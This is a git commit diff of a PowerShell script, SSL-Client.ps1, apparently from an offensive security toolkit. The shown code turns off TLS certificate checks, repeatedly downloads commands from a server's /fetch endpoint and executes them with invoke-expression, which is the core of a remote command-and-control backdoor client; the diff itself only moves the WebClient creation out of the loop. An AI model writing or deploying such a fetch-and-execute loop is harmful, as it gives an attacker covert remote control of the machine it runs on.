58aa339b8e13bbb54f740bdab5f7c22916887ac8
infosecsmith <infosecsmith@gmail.com>
2014-06-06 00:16:36 -0600

    Update SSL-Client.ps1

--- SSL-Client.ps1
+++ SSL-Client.ps1
@@ -1,8 +1,8 @@
 $server = "https://127.0.0.1:8082"
+$wc = New-Object Net.WebClient
 while($true)
 {
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$wc = New-Object Net.WebClient
 $result = $wc.DownloadString("$server/fetch")
 while($result) {
 	$output = invoke-expression $result | out-string 
